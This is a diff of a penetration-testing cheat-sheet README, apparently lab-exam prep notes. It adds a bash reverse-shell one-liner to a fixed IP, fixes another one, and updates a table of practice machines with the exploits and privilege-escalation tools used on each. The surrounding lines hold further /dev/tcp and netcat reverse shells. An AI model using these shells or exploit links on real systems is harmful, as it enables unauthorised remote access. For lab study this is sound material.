@@ -205,7 +205,8 @@ It's a collection of multiple types of lists used during security assessments, c
 sh -i >& /dev/tcp/$KaliIP/4444 0>&1
 ```
 ```
-bash -c "bash -i >& /dev/tcp/$KaliIP/4444 0>&1
+bash -c "bash -i >& /dev/tcp/192.168.45.232/80 0>&1"
+bash -c "bash -i >& /dev/tcp/$KaliIP/4444 0>&1"
 ```
 ```
 nc $kaliIP 80 -e /bin/sh
@@ -373,6 +374,7 @@ The most commonly used tools
 |Astronaut|Easy||[GravCMS Unauthenticated Arbitrary YAML Write/Update RCE - CVE-2021-21425](https://github.com/CsEnox/CVE-2021-21425)| `PHP`(SUID)|
 |BitForge|Hard|DirBuster, git-dumper|[SO Planning](https://github.com/Worteks/soplanning/blob/master/includes/demo_data.inc), [CVE-2024-27115-Exploit](https://github.com/theexploiters/CVE-2024-27115-Exploit)|pspy, `sudo -l`
 |Blackgate|Intermediate|Redis|[Redis 4.x/5.x RCE](https://github.com/Ridter/redis-rce), [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server) ||
+|Boolean|Hard||Burp, LFI, `.ssh`|`.ssh`
 |Bratarina|Easy| OpenSMTPD|[OpenSMTPD 6.6.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47984)||
 |Bullybox|Intermediate|[git-dumper](https://github.com/arthaud/git-dumper#git-dumper) | [BoxBilling<=4.22.1.5 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/51108)|`sudo`|
 |ClamAV|Easy||[Sendmail with clamav-milter < 0.91.2 - Remote Command Execution](https://www.exploit-db.com/exploits/4761)
@@ -415,8 +417,6 @@ The most commonly used tools
 |Zab|Hard|||MySql, hashcat, ligolo-ng, zabbix commnad shell, `rsync` (Sudo)|
 |ZenPhoto|Intermediate|DirBuster|[ZenPhoto 1.4.1.4 RCE - CVE-2011-4825](https://www.exploit-db.com/exploits/18083)|[rds - CVE-2010-3904](https://github.com/SecWiki/linux-kernel-exploits/tree/master/2010/CVE-2010-3904)|
 
-- [ ] [BitForge]()
-- [ ] [Boolean]()
 - [ ] [Clue]()
 - [ ] [Hetemit]()
 - [ ] [Hunit]()
